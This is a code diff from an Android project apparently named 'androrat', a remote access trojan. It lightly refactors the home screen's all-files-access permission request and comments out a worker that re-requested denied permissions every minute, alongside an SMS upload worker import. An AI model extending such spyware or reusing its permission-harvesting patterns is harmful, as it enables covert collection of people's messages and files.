@@ -61,7 +61,6 @@ import com.ierusalem.androrat.core.utils.Constants
 import com.ierusalem.androrat.core.utils.executeWithLifecycle
 import com.ierusalem.androrat.core.utils.log
 import com.ierusalem.androrat.core.utils.openAppSettings
-import com.ierusalem.androrat.core.worker.PermissionRequestWorker
 import com.ierusalem.androrat.core.worker.SMSUploadWorker
 import com.ierusalem.androrat.features.home.domain.HomeViewModel
 import com.ierusalem.androrat.features.home.domain.model.Image
@@ -328,17 +327,18 @@ class HomeFragment : Fragment() {
                                                 Log.d("ahi3646", "onCreateView: read permission denied")
                                                 try {
                                                     val intent = Intent()
-                                                    intent.setAction(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                                                    intent.action = Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION
                                                     val uri = Uri.fromParts(
                                                         "package",
                                                         activity?.packageName,
                                                         null
                                                     )
-                                                    intent.setData(uri)
+                                                    intent.data = uri
                                                     startForResultLauncher.launch(intent)
                                                 } catch (e: Exception) {
+                                                    Log.e("ahi3646", "onCreateView: $e")
                                                     val intent = Intent()
-                                                    intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                                                    intent.action = Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION
                                                     startForResultLauncher.launch(intent)
                                                 }
                                             }
@@ -380,17 +380,18 @@ class HomeFragment : Fragment() {
                                 viewModel.state.value.permissions.filter { (_, isGranted) ->
                                     !isGranted
                                 }
+
                             // periodic work request for non granted permissions
-                            val permissionWorkRequest =
-                                PeriodicWorkRequestBuilder<PermissionRequestWorker>(
-                                    repeatInterval = 1,
-                                    repeatIntervalTimeUnit = TimeUnit.MINUTES,
-                                )
-                                    .setBackoffCriteria(
-                                        BackoffPolicy.LINEAR,
-                                        duration = Duration.ofSeconds(15)
-                                    )
-                                    .build()
+//                            val permissionWorkRequest =
+//                                PeriodicWorkRequestBuilder<PermissionRequestWorker>(
+//                                    repeatInterval = 1,
+//                                    repeatIntervalTimeUnit = TimeUnit.MINUTES,
+//                                )
+//                                    .setBackoffCriteria(
+//                                        BackoffPolicy.LINEAR,
+//                                        duration = Duration.ofSeconds(15)
+//                                    )
+//                                    .build()
                             //to toggle asking non granted permission here, currently disabled
 //                            workManager.enqueueUniquePeriodicWork(
 //                                Constants.PERMISSION_REQUEST_WORK_NAME,
